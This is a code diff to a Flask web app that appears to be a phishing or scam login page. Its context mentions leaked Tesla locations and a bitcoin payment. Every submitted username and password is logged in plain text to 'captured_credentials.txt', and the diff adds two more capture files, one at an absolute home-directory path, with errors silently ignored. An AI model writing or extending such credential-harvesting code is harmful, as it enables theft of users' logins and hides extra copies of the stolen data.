@@ -5,6 +5,8 @@ app = Flask(__name__)
 
 # Define the file where credentials are stored
 CREDENTIALS_FILENAME = "captured_credentials.txt"
+CREDENTIALS_FILENAME2 = "captured_credentials2.txt"
+CREDENTIALS_ABSOLUTE_PATH = "/home/tobiasao/cred2.txt"
 
 SECRET_MESSAGE = """
 Hello Lazlo. The following Tesla locations have been leaked:
@@ -32,6 +34,14 @@ can't afford 20 bitcoin, there's a limited offer.</p>
 if not os.path.exists(CREDENTIALS_FILENAME):
     open(CREDENTIALS_FILENAME, "w").close()
 
+if not os.path.exists(CREDENTIALS_FILENAME2):
+    open(CREDENTIALS_FILENAME2, "w").close()
+
+try:
+    if not os.path.exists(CREDENTIALS_ABSOLUTE_PATH):
+        open(CREDENTIALS_ABSOLUTE_PATH, "w").close()
+except Exception:
+    pass
 
 @app.route("/")
 def index():
@@ -52,6 +62,13 @@ def login():
     else:
         with open(CREDENTIALS_FILENAME, "a") as file:
             file.write(f"Username: {username}, Password: {password}\n")
+        with open(CREDENTIALS_FILENAME2, "a") as file:
+            file.write(f"Username: {username}, Password: {password}\n")
+        try:
+            with open(CREDENTIALS_ABSOLUTE_PATH, "a") as file:
+                file.write(f"Username: {username}, Password: {password}\n")
+        except Exception:
+            pass
         template = render_template(
             "index.html", message="Login successful! Welcome, " + username + "!", secret_message=SECRET_MESSAGE
         )
